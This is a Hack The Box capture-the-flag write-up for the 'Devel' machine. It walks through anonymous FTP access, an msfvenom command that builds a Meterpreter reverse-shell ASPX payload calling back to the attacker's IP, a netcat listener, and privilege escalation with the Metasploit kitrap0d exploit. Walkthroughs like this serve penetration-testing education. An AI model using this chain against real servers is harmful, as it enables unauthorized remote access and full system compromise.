---
title: "[HTB] Devel"
author: "Wook Lee"
date: "2024-08-07"
tags: ["Hack The Box"]
---

#### Scanning with nmap

the nmap scan results show that **_ftp-anonymous_** login is allowed.
![alt text](image.png#center)

<br>

I explored a directory but couldn't find any useful info on the server.
![alt text](image-1.png#center)

<br>

Because the http port 80 server is also open, I tried navigating to the address on Firefox.
![alt text](image-2.png#center)

<br>

#### More information gathering

Then I tried gathering more information which really did not help much and that made me realize there was an easier way to go about this. Because the ftp server was open I could just generate a payload and run it on the webserver and pop the reverse shell.
![alt text](image-3.png#center)

![alt text](image-4.png#center)

![alt text](image-5.png#center)

<br>

#### Generating a payload

I generated a reverse shell payload with **_msfvenom_** and the extension is **_.asp_** since we saw the extension on the ftp server.

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=1234 -f asp > reverse.aspx`

![alt text](image-6.png#center)

<br>

uploaded the reverse shell that I generated onto the ftp server using the **_put_** command.

![alt text](image-7.png#center)

<br>

Before navigating to **http://10.10.10.5/reverse.aspx**, I had to start a netcat server to listen to the port by running the following command:
`nc -lvnp 1234`

<br>

For some reason, my netcat listener kept crashing. As an alternative, I switched to **_msfconsole_** and utilized **_multi/handler_** to listen ports.

![alt text](image-8.png#center)

<br>

![alt text](image-9.png#center)

<br>

I was able to get the shell but the user was not the admin with low privileges that I couldn't access many directories with the current user. As you could see from the picture below the **_getuid_** returned IIS APPPOOL\Web which is not the administrator. It was time to utilize the **_privilege escaltion_** to move vertically and gain access.

![alt text](image-10.png#center)

<br>

After some research, I learned that there exists a post module in meterpreter. So I backgrouned the current session and searched for the module. `search type:post path:post/multi`.

![alt text](image-11.png#center)

![alt text](image-12.png#center)

<br>

As the name of the exploit (**_local_exploit_suggester_**) implies it suggested many available exploits and I decided to use the 3rd exploit, which is **exploit/windows/local/ms10_015_kitrap0d**.

![alt text](image-13.png#center)

<br>

set the **_SESSION_** as 1, because the backgrouned session is the only session we have and set othe required options.

![alt text](image-14.png#center)

<br>

I succeeded in getting the root shell. **_getuid_** command returned NT AUTHORITY\SYSTEM, another name for root.
![alt text](image-15.png#center)

<br>

found the user flag.
![alt text](image-17.png#center)

<br>

found the root flag.
![alt text](image-16.png#center)

<br>

![alt text](image-18.png#center)
